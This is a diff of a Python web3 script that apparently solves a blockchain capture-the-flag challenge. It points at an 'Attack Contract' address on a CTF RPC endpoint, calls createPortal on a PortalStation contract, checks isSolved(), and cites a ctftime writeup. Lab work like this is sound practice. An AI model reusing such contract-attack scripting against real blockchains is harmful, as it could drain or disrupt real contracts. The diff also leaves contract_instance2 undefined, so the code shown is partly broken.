@@ -19,7 +19,7 @@ SetupContract =  x["setupAddress"]
 #Attack Contract address
 Target2Contract = "0xB89EcCb84C7CA4D2d28ecb49617982D4FF4c8CcE"
 
-url = 'http://157.245.37.125:30378/rpc'
+url = 'http://157.245.43.189:30681/rpc'
 
 w3 = Web3(Web3.HTTPProvider(url))
 block_number = w3.eth.block_number
@@ -53,10 +53,10 @@ contract_instance = w3.eth.contract(address=Target2Contract, abi=abi)
 
 #compiled = compile_files(["Portal.sol"], output_values=["abi"], solc_version="0.8.13")
 #abi = compiled['Portal.sol:PortalStation']['abi']
-compiled = compile_files(["Portal2.sol"], output_values=["abi"], solc_version="0.8.13")
-abi = compiled['Portal2.sol:PortalStation']['abi']
+#compiled = compile_files(["Portal2.sol"], output_values=["abi"], solc_version="0.8.13")
+#abi = compiled['Portal2.sol:PortalStation']['abi']
 
-contract_instance2 = w3.eth.contract(address=Target2Contract, abi=abi)
+#contract_instance2 = w3.eth.contract(address=Target2Contract, abi=abi)
 
 #number = contract_instance2.functions.destinations("orcKingdom").call()
 #print(number)
@@ -67,13 +67,13 @@ contract_instance2 = w3.eth.contract(address=Target2Contract, abi=abi)
 #number = contract_instance2.functions.destinations("").call()
 #print(number)
 
-number = contract_instance2.functions.createPortal("orcKingdom").call()
-print(number)
-number = contract_instance2.functions.createPortal("elfKingdom").call()
-print(number)
-number = contract_instance2.functions.createPortal("dawrfKingdom").call()
-print(number)
-'''
+#number = contract_instance2.functions.createPortal("orcKingdom").call()
+#print(number)
+#number = contract_instance2.functions.createPortal("elfKingdom").call()
+#print(number)
+#number = contract_instance2.functions.createPortal("dawrfKingdom").call()
+#print(number)
+
 #construct_txn = contract_instance2.functions.createPortal("elfKingdom").build_transaction(
 construct_txn = contract_instance2.functions.createPortal("orcKingdom").build_transaction(
 #construct_txn = contract_instance2.functions.createPortal("dawrfKingdom").build_transaction(
@@ -122,7 +122,6 @@ number = contract_instance.functions.isSolved().call()
 print(f'The current number stored is: { number } ')
 #
 
-'''
 
 '''
 https://ctftime.org/writeup/31583
